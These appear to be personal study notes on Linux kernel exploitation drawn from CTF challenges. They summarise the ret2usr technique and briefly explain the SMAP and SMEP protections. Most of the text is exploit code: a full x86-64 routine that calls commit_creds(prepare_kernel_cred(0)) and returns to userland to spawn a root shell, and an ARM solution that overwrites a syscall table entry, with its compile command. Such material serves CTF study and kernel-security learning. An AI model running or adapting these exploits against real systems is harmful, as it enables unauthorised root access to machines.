
## [LinuxKernelPwn](https://www.digitalwhisper.co.il/files/Zines/0x6F/DW111-1-LinuxKernelPwn.pdf)exploit
1. save the process state (`flags, rsp, ss, cs`)
2. while in kernel mode return to your exploit which 
* `commit_creds(prepare_kernel_cred(0));` , you can get their location by reading `/proc/kallsyms` (kernel all symbols)
* return to user mode (`swapgs` & `iretq`) and `system(/bin/sh)`

## [Knote](https://pwning.tech/knote/)

uses the same technique here's the exploit code

```c
long prepare_kernel_cred = 0xDEADC0D3;
long commit_creds = 0xDEADC0DE;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags = 0;

void set_ctx_reg() {
    __asm__(".intel_syntax noprefix;"
            "mov _proc_cs, cs;"
            "mov _proc_ss, ss;"
            "mov _proc_rsp, rsp;"
            "pushf;" // push rflags
            "pop _proc_rflags;"
            ".att_syntax");

    printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}


void spawn_shell()
{
    puts("[+] Hello Userland!");
    int uid = getuid();
    if (uid == 0)
        printf("[+] UID: %d (root poggers)\n", uid);
    else {
        printf("[!] UID: %d (epic fail)\n", uid);
    }

    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}

void privesc_ctx_swp()
{
    __asm__(".intel_syntax noprefix;"
            /**
             * struct cred *prepare_kernel_cred(struct task_struct *daemon)
             * @daemon: A userspace daemon to be used as a reference
             *
             * If @daemon is supplied, then the security data will be derived from that;
             * otherwise they'll be set to 0 and no groups, full capabilities and no keys.
             *
             * Returns the new credentials or NULL if out of memory.
             */
            "xor rdi, rdi;"
            "movabs rax, prepare_kernel_cred;"
            "call rax;" // prepare_kernel_cred(0)

            /**
             * int commit_creds(struct cred *new)
             * @new: The credentials to be assigned
             */
            "mov rdi, rax;" // RAX contains cred pointer
            "movabs rax, commit_creds;"
            "call rax;"

            // setup the context swapping
            "swapgs;" // swap GS to userland

            "mov r15, _proc_ss;"
            "push r15;"
            "mov r15, _proc_rsp;"
            "push r15;"
            "mov r15, _proc_rflags;"
            "push r15;"
            "mov r15, _proc_cs;"
            "push r15;"
            "lea r15, spawn_shell;" // lea rip, spawn_shell ; when returning to userland
            "push r15;"
            "iretq;" // swap context to userland
            ".att_syntax;");
}
```

## Kernel protections
SMAP - Supervisor Mode Access Prevention, sets user-space memory mappings so that **access** to those mappings from supervisor mode will cause a trap.
SMEP - Supervisor Mode Execution Prevention, same as SMAP but for **execution**. (I could have used syscall in `CrabOS` if I disabled it)

### Arm Kernel Exploitation
https://github.com/xairy/linux-kernel-exploitation?tab=readme-ov-file#ctf-tasks
https://pwnfirstsear.ch/2020/05/10/spamandhexctf2020-secstore.html#secstore-1


```c
#include <sys/syscall.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EXPLOIT 222
#define SYS_UPPER 223
#define SYS_CALL_TABLE 0x8000e348

long commit_creds = 0x8003f56c;
long prepare_kernel_creds = 0x8003f924;

void exploit() {
    puts("[+] redirected syscall execution");
    // volatile keyword idicates that the instuctions has important side-effects.
    asm volatile (
        "eor r0, r0\n"
        // "bl prepare_kernel_creds\n"
        // "bl commit_creds\n"
    );
    puts("[+] privileges escaleted");
    exit(0);        
}

int main(int argc, char *argv[]) {
    unsigned int** syscall_table = (unsigned int**)SYS_CALL_TABLE;
    char *entry_value = "\x89\x01\x03\x01";
    int hook_address = 0;
    printf("[*] exploit location: %p\n", (void *)exploit);
    
    // overwrite an empty syscall
    syscall(SYS_UPPER, entry_value, &syscall_table[EXPLOIT]);
    syscall(SYS_UPPER, &syscall_table[EXPLOIT], (char *)&hook_address);
    printf("[*] hook address: %p\n", (int *)hook_address);

    // triger hook
    exploit();
    // syscall(EXPLOIT);
    return 0;
}

/* 
gcc -Wl,--section-start=.text=0x1030110 sol.c -o sol
*/
```
